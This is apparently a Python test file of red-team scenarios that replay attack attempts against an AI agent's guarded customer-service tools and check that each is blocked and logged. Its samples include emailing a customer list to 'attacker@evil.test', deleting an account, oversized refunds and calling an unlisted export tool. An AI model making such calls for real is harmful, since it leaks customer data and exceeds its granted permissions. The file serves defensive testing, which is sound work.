"""Red-team scenarios: recorded attack attempts replayed against the guarded tools.
Each scenario passes when the dangerous action is blocked and the attempt is visible in the audit log."""
from __future__ import annotations

SCENARIOS = [
    {"id": "refund-too-large", "call": ("issue_refund", {"order_id": "BL-10301", "amount": 900}), "expect": "not permitted"},
    {"id": "email-third-party", "call": ("send_email", {"to": "attacker@evil.test", "body": "customer list"}), "expect": "not permitted"},
    {"id": "delete-account", "call": ("delete_customer", {"email": "lee@example.com"}), "expect": "not permitted"},
    {"id": "unlisted-tool", "call": ("export_all_orders", {}), "expect": "not permitted"},
    {"id": "refund-small-declined", "call": ("issue_refund", {"order_id": "BL-10301", "amount": 40}), "expect": "declined"},
]
